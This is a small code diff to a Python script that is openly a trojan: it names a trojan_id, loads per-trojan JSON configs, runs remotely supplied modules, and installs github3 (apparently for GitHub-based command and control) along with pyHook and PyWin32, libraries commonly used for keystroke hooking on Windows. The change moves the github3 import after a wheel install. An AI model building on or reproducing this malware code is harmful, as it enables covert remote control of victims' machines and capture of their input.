@@ -9,7 +9,6 @@ import Queue
 import os
 import pip
 import socket
-from github3 import login
 trojan_id = "abc"
 #each trojan exicutes the json file ment for him there is a json file called abc
 trojan_config = "%s.json" % trojan_id
@@ -121,6 +120,8 @@ def module_runner(module):
 def run_module(module):
     #sys.modules give all modules that were imported so far, can run it from there
     return sys.modules[module].run()
+install_wheel("github3.py-0.9.3-py2.py3-none-any.whl")
+from github3 import login
 get_wheel("pyHook")
 get_wheel("PyWin32")
 install_wheel("pyHook")#cant make modules import out of github
